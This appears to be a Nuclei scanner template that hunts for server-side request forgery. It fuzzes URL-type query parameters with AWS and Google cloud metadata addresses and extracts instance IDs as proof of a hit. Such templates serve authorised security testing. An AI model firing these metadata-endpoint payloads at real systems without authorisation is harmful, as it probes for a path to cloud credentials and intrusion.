id: THENAWABX_FOUND_SSRF
info:
  name: Nawab-Confirmed-SSRF-Hunter
  author: thenawabx
  severity: critical

http:
  - pre-condition:
      - expr: "queue.has_params"

    payloads:
      ssrf_payloads:
        - "http://169.254.169.254/latest/meta-data/instance-id"
        - "http://169.254.169.254/computeMetadata/v1/instance/id"
        - "http://metadata.google.internal/computeMetadata/v1/instance/id"

    fuzzing:
      - part: query
        type: replace
        mode: multiple
        keys:
          - "url"
          - "dest"
          - "uri"
          - "path"
          - "redirect"
          - "callback"
          - "link"
          - "file"
        fuzz:
          - "{{ssrf_payloads}}"

    headers:
      Metadata-Flavor: "Google"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "\bi-[a-f0-9]{17}\b"
          - "\bi-[a-f0-9]{8}\b"
          - "^[0-9]{15,25}$"
        condition: or

      - type: word
        part: body
        negative: true
        words:
          - "Cloudflare"
          - "Just a moment"
          - "Access Denied"
          - "Forbidden"
          - "example.com"
          - "aws"
          - "google"
          - "metadata"
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - "\bi-[a-f0-9]{17}\b"
          - "\b[0-9]{15,25}\b"
